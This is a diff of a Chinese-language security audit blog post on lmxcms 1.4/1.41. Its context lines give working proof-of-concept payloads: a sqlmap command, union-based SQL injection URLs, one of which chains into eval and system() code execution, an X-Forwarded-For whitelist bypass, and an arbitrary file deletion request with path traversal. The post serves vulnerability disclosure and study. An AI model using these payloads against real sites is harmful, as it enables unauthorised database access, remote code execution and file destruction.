@@ -1,5 +1,5 @@
 ---
-title: lmxcms全漏洞poc
+title: lmxcms1.41源码审计
 copyright: true
 date: 2022-02-10 14:52:26
 tags: 渗透测试
@@ -38,7 +38,7 @@ sqlmap：
 ```
 python2 sqlmap.py -r lmx1.txt --technique=E -v3 --tamper=chardoubleencode -p name --dbs
 ```
-
+<br>
 **1.4/1.41后台sql注入漏洞**  
 c/index/AcquisiAction.class.class.php  
 POST的参数未过滤，但后台本身可以执行sql语句（无回显），此漏洞危害较低  
@@ -54,11 +54,12 @@ c/admin/AcquisAction.class.php 中 311行查询时对获取的lid参数未检验
 Poc: http://127.0.0.1:8081/lmxcms1.4/admin.php?m=Acquisi&a=showCjData&lid=-1+union+select+1,1,1,(select+1+and+(updatexml(1,concat(0x7e,(select+database()),0x7e),1))),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
 ```
 ![9.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/9.png?raw=true)  
+<br>
 **1.4/1.41绕过ip白名单**  
 
 后台ip白名单可通过X-Forwarded-For 绕过  
 ![10.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/10.png?raw=true)  
-
+<br>
 **1.4/1.41后台任意代码执行**
 c/admin/AcquisAction.class.php 中 318行eval执行了$temdata['data']参数，该参数的值是从lmx_cj_list数据表中查询出的array字段的值，而查询时存在sql注入导致该字段可控，从而导致任意代码执行。  
 ![11.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/11.png?raw=true)  
@@ -66,6 +67,7 @@ c/admin/AcquisAction.class.php 中 318行eval执行了$temdata['data']参数，�
 Poc: admin.php?m=Acquisi&a=showCjData&lid=-1+union+select+1,1,1,'1;system(\'ipconfig\');',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1
 ```
 ![12.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/12.png?raw=true)  
+<br>
 **1.4/1.41 后台任意文件删除**  
 c/admin/FileAction.class.php 中使用unlink方法删除文件，unlink方法调用php unlink方法，此处未对传入的路径做检查，存在任意文件删除。  
 ![13.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/13.png?raw=true)  
@@ -88,6 +90,7 @@ Upgrade-Insecure-Requests: 1
 type=0&delImages=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87&fid%5B%5D=7#####/test.txt
 ```
 其中test.txt在index.php 同级目录下，且可使用..进行目录穿越。  
+<br>
 **1.4/1.41 后台任意文件读取**  
 c/admin/TemplateAction.class.php  
 ![14.png](https://github.com/lockcy/penetration-kb/blob/master/pic/lmxcms1.41%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/14.png?raw=true)  
